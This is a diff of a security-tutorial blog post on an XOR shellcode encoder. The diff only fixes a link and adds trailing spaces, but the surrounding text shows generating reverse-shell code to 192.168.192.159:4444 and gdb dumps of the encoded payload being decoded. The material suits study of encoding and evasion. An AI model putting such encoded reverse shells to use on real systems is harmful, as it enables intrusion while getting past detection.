@@ -18,7 +18,7 @@ During decoding procedure, XOR operation will be preformed to restore original s
 
 ## Shell code ##
 
-We can use reverse shell code and wrapper form previous ![blog post](https://smarinovic.github.io/posts/Reverse-shell/) which establishes connection to defined remote address at defined port (in our case IP address is 192.168.192.159 and port is 4444). 
+We can use reverse shell code and wrapper form previous [blog post](https://smarinovic.github.io/posts/Reverse-shell/) which establishes connection to defined remote address at defined port (in our case IP address is 192.168.192.159 and port is 4444). 
 
 ```
 python wrapper.py 192.168.192.159 4444
@@ -154,7 +154,7 @@ esi            0x404067            0x404067
 So in order to observe decoing, we will monitor first 10 bytes starting at ```0x404067``` memory address.
 At beggining address contain encoded shell code (0x3e, 0x90, 0xcf, 0x90, 0x3e, 0x90 ...)
 
-* Initial data on address ```0x404067```
+* Initial data on address ```0x404067```  
 
 ```
 gdb-peda$ x/10b 0x404067
@@ -162,7 +162,7 @@ gdb-peda$ x/10b 0x404067
 0x40406f <shellcode+47>:        0x3e    0x90
 ```
 
-* content of the same address after few itterations:
+* content of the same address after few itterations:  
 We can see that 0x3e is decoded to 0x31 (XOR 0x0F, 0x3e = 0x31) and 0x90 is ignored and overwritten.
 
 ```
@@ -171,7 +171,7 @@ gdb-peda$ x/10b 0x404067
 0x40406f <shellcode+47>:        0x3e    0x90
 ```
 
-* content of the same address after some more itterations:
+* content of the same address after some more itterations:  
 We can see that decoded shell code doesn't not contain added NOPs and that all opcodes are XORed (0x3e XOR 0f = 0x31, 0xcf XOR 0x0f = 0xc0, etc.) and it has overwritten original encoded opcodes:
 ```
 gdb-peda$ x/10b 0x404067
